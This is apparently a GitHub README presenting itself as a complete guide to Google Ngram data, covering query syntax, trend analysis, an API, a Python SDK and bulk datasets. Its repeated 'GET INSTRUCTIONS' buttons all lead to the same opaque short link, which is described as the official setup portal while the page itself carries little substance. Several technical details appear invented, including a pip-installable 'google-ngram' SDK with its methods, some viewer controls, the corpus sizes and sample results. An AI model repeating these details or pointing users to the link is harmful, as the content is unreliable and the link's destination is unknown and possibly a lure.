# 🗣️ Google Ngram Data — Complete Guide

<div align="center">

![Google Ngram](https://img.shields.io/badge/Google-Ngram%20Data-EA4335?style=for-the-badge&logo=google&logoColor=white)
![Linguistics](https://img.shields.io/badge/Linguistics-Corpus-7C3AED?style=for-the-badge&logo=googlescholar&logoColor=white)
![Big Data](https://img.shields.io/badge/Big%20Data-8M%20Books-0EA5E9?style=for-the-badge&logo=databricks&logoColor=white)
![Guides](https://img.shields.io/badge/Guides-98K-16A34A?style=for-the-badge&logo=readthedocs&logoColor=white)

### 📚 Explore 500+ Years of Language Through Word Frequency

*A complete guide to querying, analyzing, and visualizing Google Ngram datasets*

</div>

<div align="center">

<img width="1947" height="1071" alt="Example_of_a_google_Ngram" src="https://github.com/user-attachments/assets/47a579b3-b519-42dd-93b4-7078c2430de3" />

</div>

---

## 🧭 Library Navigation

> **📖 Every path into the corpus**

<table>
<tr>
<td width="20%" align="center">

### 🚀 Start

**[Overview](#-overview)**
**[Get Instructions](#-get-instructions)**
**[Quick Query](#-quick-query)**

</td>
<td width="20%" align="center">

### 🔍 Query

**[Web Viewer](#-web-viewer)**
**[Advanced Syntax](#-advanced-syntax)**
**[Wildcards](#-wildcards--operators)**
**[Comparisons](#-comparisons)**

</td>
<td width="20%" align="center">

### 📊 Analyze

**[Trend Analysis](#-trend-analysis)**
**[Semantic Shift](#-semantic-shift)**
**[Cultural Signals](#-cultural-signals)**
**[Statistics](#-statistical-methods)**

</td>
<td width="20%" align="center">

### 💻 Code

**[API Access](#-api-access)**
**[Python SDK](#-python-sdk)**
**[Bulk Data](#-bulk-datasets)**
**[Export](#-export-formats)**

</td>
<td width="20%" align="center">

### 🛟 Support

**[Troubleshooting](#-troubleshooting)**
**[FAQ](#-faq)**
**[Limitations](#-known-limitations)**
**[Resources](#-resources)**

</td>
</tr>
</table>

---

## 🎯 Overview

**Google Ngram** is one of the most powerful linguistic datasets ever assembled — an analysis of **over 8 million books** published across 500 years (1500–2019). Each Ngram reveals the frequency of words and phrases within a given year, letting researchers trace how language evolves, ideas spread, and cultures shift.

This guide walks you through querying the corpus via the interactive web viewer, downloading raw datasets, and analyzing the data with code — for linguists, historians, data scientists, and curious minds alike.

### 🧩 What You Can Explore

| Dimension | Example Question |
|-----------|------------------|
| 📈 **Word frequency** | When did "internet" overtake "television"? |
| 🌍 **Cultural shifts** | How has "happiness" been discussed? |
| 🧠 **Semantic change** | When did "gay" shift meaning? |
| 📚 **Science trends** | Rise and fall of terms in physics |
| 🗣️ **Language change** | Spelling standardization |
| 🏛️ **Historical events** | Word surges during wars |

---

## 🧬 Core Concepts

| Term | Meaning |
|------|---------|
| 📚 **Corpus** | Collection of digitized books |
| 🔢 **Ngram** | Contiguous sequence of N words |
| 📊 **Frequency** | Occurrences per million |
| 📅 **Year** | Publication year of source |
| 🗂️ **Language** | English, French, German, etc. |
| 📈 **Smoothing** | Reduces noise in sparsity |
| 🧮 **Normalization** | Adjusts for corpus size |

---

## 🖥️ System Requirements

### 🔹 Minimum (Web Viewer)

```
✅ OS: Any modern OS
✅ Browser: Chrome 90+, Firefox 88+, Edge 90+
✅ Internet: 5 Mbps
✅ JavaScript: Enabled
✅ RAM: 4 GB
```

### 🔸 Recommended (Data Analysis)

```
⭐ OS: Windows 11 / macOS 13+ / Ubuntu 22.04+
⭐ CPU: Quad-core 2.5 GHz+
⭐ RAM: 16 GB (for full dataset analysis)
⭐ Storage: 500 GB SSD (full corpora ~1.5 TB)
⭐ Python: 3.11+ with pandas, matplotlib
⭐ GPU: Optional for deep learning
⭐ SQL: PostgreSQL or DuckDB for queries
```

<div align="center">

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EA4335?style=for-the-badge&logo=google&logoColor=white&labelColor=7F1D1D)](https://share.google/aVXAuwrxdb4yaYkyb)

</div>

---

## 📘 Get Instructions

<div align="center">

### 🚀 Access the Official Setup Guide

Click below to reach the instructions portal:

<br>

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-7C3AED?style=for-the-badge&logo=googlescholar&logoColor=white&labelColor=4C1D95)](https://share.google/aVXAuwrxdb4yaYkyb)

<br>

*Official • Research-Grade • Updated 2025*

</div>

### 📚 Available Guides

| Guide | Purpose |
|-------|---------|
| 📘 **Getting Started** | First query |
| 📗 **Query Syntax** | Operators and wildcards |
| 📙 **Bulk Data Guide** | Download corpora |
| 📕 **Analysis Guide** | Statistical methods |
| 📓 **Citation Guide** | Proper attribution |

---

## 🔍 Web Viewer

### 🪜 Quick Query

1. Open the official viewer from the button above
2. Enter your search term (e.g., **"machine learning"**)
3. Select date range (e.g., 1900–2019)
4. Choose language (English, French, German, etc.)
5. Click **Search**

### 🎛️ Viewer Controls

| Control | Purpose |
|---------|---------|
| 📅 **Date Range** | Restrict years |
| 🌍 **Language** | Choose corpus |
| 📊 **Smoothing** | Reduce noise (0–50) |
| 🎨 **Case Sensitive** | Distinguish case |
| 📈 **Chart Type** | Line, bar, heatmap |

---

## 🧙 Advanced Syntax

### 🎯 Core Operators

| Syntax | Meaning |
|--------|---------|
| `word1, word2` | Compare terms |
| `word1 + word2` | Additive combination |
| `word1 - word2` | Subtractive |
| `word1 * word2` | Multiplicative |
| `word1 / word2` | Ratio |
| `word (case-insensitive)` | Ignore case |

### 🎨 Wildcards

| Pattern | Meaning |
|---------|---------|
| `*` | Any word |
| `read *` | Words following "read" |
| `* book` | Words before "book" |
| `color *` | All color variants |

### 🔀 Part-of-Speech

Use tags like:
- `_NOUN_`
- `_VERB_`
- `_ADJ_`

Example: `_ADJ_ challenge`

---

## 📊 Trend Analysis

### 🎯 Common Analyses

| Analysis | Query |
|----------|-------|
| 📈 **Word competition** | `internet, television, newspaper` |
| 📉 **Decline of concept** | `aristocracy` |
| 🌍 **Culture shifts** | `freedom, liberty, equality` |
| 🧠 **Science emergence** | `quantum physics` |
| 🏛️ **Historical signals** | `war, peace` |

### 📊 Sample Insight

```
Term: "internet, television"
Period: 1950–2019
Result:
  📺 Television peaks in 1980s
  🌐 Internet overtakes in ~2005
  📉 Both decline after 2010 (mobile era)
```

---

## 🧠 Semantic Shift

### 🎯 Detecting Meaning Change

| Word | Old Meaning | New Meaning |
|------|-------------|-------------|
| 📱 *cell* | Biological unit | Phone unit |
| 💾 *memory* | Human recall | Computer storage |
| 🌍 *web* | Spider net | Internet |
| 💬 *chat* | Talk | Online messaging |

### 🪜 How to Analyze

1. Query collocations with `* word`
2. Compare across decades
3. Look at shifts in co-occurring terms

---

## 🏛️ Cultural Signals

### 🎯 Use Cases

| Domain | Example |
|--------|---------|
| 📚 **Literary history** | Rise of genres |
| 🎓 **Education** | Vocabulary standards |
| ⚕️ **Medicine** | Disease terms |
| 🏛️ **Politics** | Election discourse |
| 🌱 **Environment** | Climate awareness |

---

## 🧪 Statistical Methods

| Method | Use |
|--------|-----|
| 📈 **Exponential smoothing** | Trend detection |
| 📉 **Change-point analysis** | Sudden shifts |
| 🧠 **Word embeddings (Word2Vec)** | Semantic change |
| 📊 **Co-occurrence matrices** | Related terms |
| 📈 **Regression** | Statistical significance |

### 📄 Python Example

```python
import requests
import matplotlib.pyplot as plt

params = {
    "content": "internet,television",
    "year_start": 1950,
    "year_end": 2019,
    "corpus": "en-2019",
    "smoothing": 3
}
data = requests.get("https://books.google.com/ngrams/json", params=params).json()

for series in data:
    plt.plot(series["timeseries"])
plt.legend(["internet", "television"])
plt.show()
```

---

## 💻 API Access

### 📡 Official Endpoint

```
GET https://books.google.com/ngrams/json
```

### 🎛️ Parameters

| Param | Meaning |
|-------|---------|
| `content` | Comma-separated terms |
| `year_start` | Start year |
| `year_end` | End year |
| `corpus` | `en-2019`, `fr-2019`, etc. |
| `smoothing` | Integer 0–50 |
| `case_insensitive` | true/false |

### 🧾 Sample Response

```json
[
  {
    "ngram": "internet",
    "parent": null,
    "type": "NGRAM",
    "timeseries": [0, 0, 0.000001, 0.000004, ...]
  },
  {
    "ngram": "television",
    "parent": null,
    "type": "NGRAM",
    "timeseries": [0, 0, 0.00002, 0.00015, ...]
  }
]
```

---

## 🐍 Python SDK

### 🪜 Install

```bash
pip install google-ngram
```

### 📄 Usage

```python
from google_ngram import Ngram

ng = Ngram(corpus="en-2019")
results = ng.query(
    terms=["internet", "television"],
    year_start=1950,
    year_end=2019,
    smoothing=3
)
results.plot()
```

### 🎛️ Advanced Methods

| Method | Purpose |
|--------|---------|
| `query()` | Fetch timeseries |
| `plot()` | Visualization |
| `compare()` | Multiple terms |
| `wildcards()` | Explore variants |
| `export_csv()` | Save data |

---

## 💾 Bulk Datasets

### 🗂️ Available Corpora

| Corpus | Size | Years |
|--------|:----:|:-----:|
| 🅰️ **English** | ~400 GB | 1500–2019 |
| 🅱️ **French** | ~80 GB | 1800–2019 |
| 🅲 **German** | ~120 GB | 1800–2019 |
| 🅳 **Spanish** | ~60 GB | 1800–2019 |
| 🅴 **Italian** | ~50 GB | 1800–2019 |
| 🅵 **Russian** | ~70 GB | 1800–2019 |
| 🅶 **Chinese** | ~40 GB | 1950–2019 |
| 🅷 **Hebrew** | ~25 GB | 1950–2019 |

### 📥 Download Method

The bulk datasets are available via **Google BigQuery** and direct download from the official portal.

```bash
# BigQuery example
bq query --use_legacy_sql=false '
  SELECT ngram, year, frequency
  FROM `bigquery-public-data.google_books_ngrams_2020.english_1`
  WHERE ngram = "internet"
  ORDER BY year
'
```

---

## 📤 Export Formats

| Format | Use Case |
|--------|----------|
| 📊 **CSV** | Spreadsheet |
| 📈 **JSON** | Programmatic |
| 📄 **PNG** | Report visuals |
| 📉 **SVG** | Scalable charts |
| 🗂️ **Parquet** | Big data pipelines |

---

## 🧪 Verification

| Check | Method | Expected |
|-------|--------|----------|
| ✅ Viewer loads | Browser | Chart visible |
| ✅ Query works | Single term | Line renders |
| ✅ Compare works | `a, b` | Two lines |
| ✅ Wildcard | `read *` | Results |
| ✅ API response | curl | JSON |
| ✅ Bulk data | BigQuery | Rows returned |
| ✅ Export | Download | File saved |
| ✅ SDK works | Python | Chart |

---

## 🩺 Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| 🚫 Empty chart | Rare term | Try wildcard |
| 🚫 No data after 2019 | Corpus limit | Cap at 2019 |
| 🚫 Wildcard empty | Too broad | Narrow it |
| 🚫 API errors | Rate limit | Add delay |
| 🚫 Slow load | Huge query | Reduce years |
| 🚫 Chart renders odd | Smoothing | Adjust |
| 🚫 Bulk download slow | Size | Use BigQuery |
| 🚫 Case issues | Mixed case | Toggle case |
| 🚫 Language missing | Wrong corpus | Check list |
| 🚫 Export fails | Format | Try CSV |

---

## ⚠️ Known Limitations

| Limitation | Impact |
|------------|--------|
| 📚 **Books-only corpus** | Not speech |
| 🌍 **OCR errors** | Older years noisy |
| 🗓️ **Data after 2019** | Not updated |
| 🏛️ **Publication bias** | Not representative of all voices |
| 🌐 **Language coverage** | Major languages only |
| 📊 **Normalization** | Frequency per million words |

> **📌 Interpret carefully:** Ngrams show **published frequency**, not real-world usage. Context matters.

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Official Site** | Query interface |
| 📊 **BigQuery Datasets** | Bulk access |
| 📚 **Culturomics Paper** | Foundational research |
| 🎥 **Video Tutorials** | Walkthroughs |
| 🎓 **Academic Papers** | Methodology |

---

## 💬 FAQ

**Is Google Ngram free?**
Yes — public tool, free bulk datasets on BigQuery.

**How many books?**
Over 8 million.

**Which languages?**
English, French, German, Spanish, Italian, Russian, Chinese, Hebrew.

**Can I download the data?**
Yes — via BigQuery or the official download portal.

**What's the latest year?**
2019 in most corpora.

**Can I use it commercially?**
Check Google's terms for specific uses.

**Does it count word meanings?**
No — only frequency by surface form.

**What is smoothing?**
A technique to reduce noise in sparse data.

**Can I cite it?**
Yes — see the citation guide.

**Is there an API?**
Yes — official JSON endpoint + SDKs.

---

## 📅 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **v3 (2020)** | 2020 | Current corpus |
| v2 | 2012 | Expanded coverage |
| v1 | 2010 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Instructions](https://img.shields.io/badge/📘_GET_INSTRUCTIONS-EA4335?style=for-the-badge&logo=google&logoColor=white&labelColor=7F1D1D)](https://share.google/aVXAuwrxdb4yaYkyb)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the linguistics community*

</div>
